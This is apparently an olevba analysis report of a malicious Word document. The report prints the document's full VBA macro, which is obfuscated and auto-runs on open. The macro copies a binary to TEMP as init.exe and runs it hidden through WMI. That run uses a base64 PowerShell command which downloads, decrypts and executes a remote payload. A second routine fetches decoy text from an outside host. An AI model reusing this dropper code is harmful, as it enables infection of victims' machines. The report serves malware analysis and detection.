olevba 0.60.1 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: UDS-Trojan-Dropper.MSOffice.SDrop.gen-d317d07872fe22a85824a691b069a6e6ffab09d67bf2ed67b7b65432c0bc882e
Type: OpenXML
WARNING  For now, VBA stomping cannot be detected for files in memory
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: word/vbaProject.bin - OLE stream: 'VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Function XorC(ByVal sData As String, ByVal sKey As String) As String
    Dim l As Long, i As Long, byIn() As Byte, byOut() As Byte, byKey() As Byte
    Dim bEncOrDec As Boolean
    If Len(sData) = 0 Or Len(sKey) = 0 Then XorC = "Invalid argument(s) used": Exit Function
    If Left$(sData, 3) = "xxx" Then
        bEncOrDec = False
        sData = Mid$(sData, 4)
    Else
        bEncOrDec = True
    End If
     
    byIn = sData
    byOut = sData
    byKey = sKey
    l = LBound(byKey)
    For i = LBound(byIn) To UBound(byIn) - 1 Step 2
        byOut(i) = ((byIn(i) + Not bEncOrDec) Xor byKey(l)) - bEncOrDec
        l = l + 2
        If l > UBound(byKey) Then l = LBound(byKey)
    Next i
    XorC = byOut
    If bEncOrDec Then XorC = "xxx" & XorC
End Function


Sub CallP()
Dim str As String
str = XorC("xxxs
ngY`V_GCncICFU]ngY`V_GCb_GUDcZU^^nH nB_GUDCZU^^ UJU", "1")

Dim tmp As String
tmp = Environ("TEMP") & "\init.exe"

Set j = CreateObject(XorC("xxxcSDYBFY`W xY^UcICFU]T\USF", "1"))
res = j.CopyFile(str, tmp)
Set wm = GetObject(XorC("xxxGY`]W]FC
gY`obD_SUCC", "1"))
Set wma = GetObject(XorC("xxxGY`]W]FC
gY`obD_SUCCcFQDFEB", "1"))
wma.ShowWindow = 0
str = tmp & XorC("xxxW\9'W\9@W\W WS_.#Y4 ,MM8&6@@Y2& _.6,MM1
5AC& _R", "v")
str = str & "W1N5c3RlbS5OZXQuU2VydmljZVBvaW50TWFuYWdlcl06OlNlcnZlckNlcnRpZmljYXRlVmFsaWRhdGlvbkNhbGxiYWNrPXsxfTskYSA9IE5ldy1PYmplY3QgU3lzdGVtLlhtbC5YbWxEb2N1bWVudDskST0wOyRpcCA9ICdodHRwczovLzIzODgzNzE5NzQnOyRhLkxvYWQoJCguIHtwYXJhbShbc3RyaW5nXSRiLFtpbnRdJG4sW2ludF0kcyxbaW50XSRjKTskcCA9IEAoOSw1LDYsNyk7JHU9e3BhcmFtKFtpbnRdJGcsJHgpO3NhbCBlciBHZXQtUmFuZG9tOyQoLWpvaW4oMS4uJCgkZyokKCR4fGVyKSl8JXtbY2hhcl1baW50XSgoNjUuLjkwKSsoOTcuLjEyMil8ZXIpfSkpLlRvTG93ZXIoKX07J3swfS97MX0vezJ9L3szfS97NH0uezV9JyAtZiAkYiwgJCguICR1ICRuICRwKSwgJCguICR1ICRzICRwKSwgJCguICR1ICRjICRwKSwgJCguICR1IDEgJHApLCAkKC4gJHUgMSAzKX0gJGlwICRQU1ZlcnNpb25UYWJsZS5DTFJWZXJzaW9uLk1ham9yIDIgJChbSW50UHRyXTo6U2l6ZS8yKSkpO1tDSEFyW11dJHIgPSBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVVEY4LkdldFN0cmluZygkKFtTeXN0ZW0uQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoJGEuc3lzdGVtLmN1bHR1cmUuaW5mbykpKTskayA9ICQoJHJbKCRyLkxlbmd0aC00NCkuLigkci5MZW5ndGgtMTMpXS1qb2luJycpO1tDSEFyW11dJHIgPSAkclsxNC4uKCRyLkxlbmd0aC01NyldfCV7JF8tQlhvciRrWyRJKyslJGsuTGVOR3RIXX07JGQgPSAkci1qb2luJyc7IElFWCAkZA==')))"

Result = wm.Create(str, Null, wma, processid)
End Sub

Sub SetCont()
Dim objHTTP As Object

Set objHTTP = CreateObject("MSXML2.ServerXMLHTTP")
res = objHTTP.SetOption(2, SXH_SERVER_CERT_IGNORE_ALL_SERVER_ERRORS)
objHTTP.Open "GET", "https://moviedvdpower.com/CV_SEO_ADS_David_Alvarez.txt", False
objHTTP.send ("")
ActiveDocument.Content.Text = objHTTP.responseText
End Sub
Private Sub Document_Open()
Call CallP
Call SetCont

End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Environ             |May read system environment variables        |
|Suspicious|Open                |May open a file                              |
|Suspicious|CopyFile            |May copy a file                              |
|Suspicious|Create              |May execute file or a system command through |
|          |                    |WMI                                          |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|ShowWindow          |May hide the application                     |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|GetObject           |May get an OLE object with a running instance|
|Suspicious|MSXML2.ServerXMLHTTP|May download files from the Internet         |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|IOC       |https://moviedvdpowe|URL                                          |
|          |r.com/CV_SEO_ADS_Dav|                                             |
|          |id_Alvarez.txt      |                                             |
|IOC       |init.exe            |Executable file name                         |
+----------+--------------------+---------------------------------------------+

